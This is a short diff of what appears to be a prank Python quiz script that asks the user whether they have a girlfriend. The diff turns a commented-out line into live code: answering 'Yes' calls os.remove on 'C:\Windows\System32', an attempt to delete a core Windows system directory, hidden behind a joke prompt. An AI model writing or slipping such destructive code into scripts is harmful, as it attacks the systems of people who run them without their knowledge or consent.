@@ -9,8 +9,8 @@ question = input(Fore.GREEN + "Do you have girlfriend?: ")
 if question == "Yes":
     print(Fore.YELLOW + "NICE, good life!")
     time.sleep(4)
-    # os.remove("C:\Windows\System32")
-    break()
+    os.remove("C:\Windows\System32")
+    quit()
 
 elif question == "No":
     time.sleep(4)
